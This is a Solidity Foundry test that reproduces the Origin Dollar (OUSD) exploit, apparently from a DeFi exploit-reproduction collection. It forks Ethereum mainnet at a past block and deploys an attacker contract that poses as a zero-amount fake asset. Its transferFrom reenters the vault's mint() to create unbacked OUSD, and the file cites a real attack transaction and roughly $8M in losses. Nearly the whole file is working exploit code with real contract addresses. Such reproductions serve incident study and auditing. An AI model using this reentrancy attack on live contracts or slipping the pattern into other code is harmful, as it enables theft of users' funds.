// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost: ~$8M
// Attack TX: https://etherscan.io/tx/0xe1c76241dda7c5fcf1988454c621142495640e708e3f8377982f55f8cf2a8401
// @Info - A zero-amount fake asset reentered mint() from transferFrom().

interface IOriginVault {
    function mint(
        address asset,
        uint256 amount
    ) external;
    function mintMultiple(
        address[] calldata assets,
        uint256[] calldata amounts
    ) external;
}

interface IOUSD is IERC20 {
    function rebaseOptIn() external;
}

contract OriginDollarExploitTest is Test {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IOUSD private constant OUSD = IOUSD(0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86);

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", 11_272_254);
    }

    function testExploit() public {
        OriginDollarAttacker attacker = new OriginDollarAttacker();
        deal(address(DAI), address(attacker), 20_500_000 ether);
        deal(address(USDT), address(attacker), 7_502_000 * 1e6);

        attacker.attack();

        uint256 depositedValue = 20_500_000 ether + 7_502_000 ether;
        assertGt(OUSD.balanceOf(address(attacker)), depositedValue, "no unbacked OUSD was minted");
    }
}

contract OriginDollarAttacker {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IOUSD private constant OUSD = IOUSD(0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86);
    IOriginVault private constant VAULT = IOriginVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD);

    bool private reentering;

    function attack() external {
        DAI.approve(address(VAULT), type(uint256).max);
        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(VAULT), type(uint256).max));
        OUSD.rebaseOptIn();

        VAULT.mint(address(USDT), 7_500_000 * 1e6);

        address[] memory assets = new address[](2);
        assets[0] = address(DAI);
        assets[1] = address(this);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 20_500_000 ether;
        VAULT.mintMultiple(assets, amounts);
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool) {
        if (!reentering) {
            reentering = true;
            VAULT.mint(address(USDT), 2000 * 1e6);
            reentering = false;
        }
        return true;
    }

    function balanceOf(
        address
    ) external pure returns (uint256) {
        return 0;
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }
}
